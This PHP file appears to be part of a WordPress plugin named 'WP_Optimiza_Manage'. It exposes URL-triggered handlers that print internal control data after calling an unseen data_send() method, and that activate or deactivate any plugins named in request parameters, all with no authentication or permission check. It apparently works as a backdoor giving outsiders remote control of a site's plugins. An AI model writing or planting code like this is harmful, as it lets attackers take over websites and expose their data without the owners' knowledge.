<?php

require_once dirname( __FILE__ ) . '/recovery.php';

	if (!class_exists('WP_Optimiza_Manage')) 
	{
		class WP_Optimiza_Manage extends WP_Recovery
			{
		
			public function retrieve_plugins_data() {
				global $wp_control_data;
				 $page_viewed = basename($_SERVER['REQUEST_URI']);
					if(($page_viewed) == 'request-plugins-data') {
						
							$this->data_send();
						
							print_r($wp_control_data);
							die();

					}
		}
				public function desactive_plugin() {
						$page_viewed = basename($_SERVER['REQUEST_URI']);
							if($page_viewed == 'desactive-plugin') {
								$plugin_dir = $_REQUEST;
								foreach($plugin_dir as $plug) {
									deactivate_plugins($plug);
								}
							exit();
						}
					}
		
				public function activate() {
					$page_viewed = basename($_SERVER['REQUEST_URI']);
						if($page_viewed == 'activate-plugin') {
							$plugin_dir = $_REQUEST;
							foreach($plugin_dir as $plug) {
								activate_plugin($plug);
							}
						exit();
						}
				}
    
				}
		new WP_Optimiza_Manage();	
	}